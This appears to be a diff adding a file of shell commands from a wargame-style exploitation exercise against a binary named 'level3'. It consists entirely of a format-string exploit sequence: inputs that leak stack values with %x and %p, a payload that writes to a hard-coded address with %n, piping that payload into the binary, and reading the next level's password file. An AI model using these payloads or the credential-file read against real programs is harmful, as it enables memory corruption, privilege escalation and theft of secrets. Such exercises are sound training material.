@@ -1,0 +1,6 @@
+python -c "print '\x8c\x98\x04\x08 %x %x %x %x'" | ./level3
+python -c  'print "aaaaaa" + "%p "*10' | ./level3
+python -c  'print "aaaaaaa" + "%4$p "' | ./level3
+python -c  'print "\x8c\x98\x04\x08" + "a" *60 + "%4$n"' > test
+cat test - | ./level3
+cat /home/user/level4/.pass
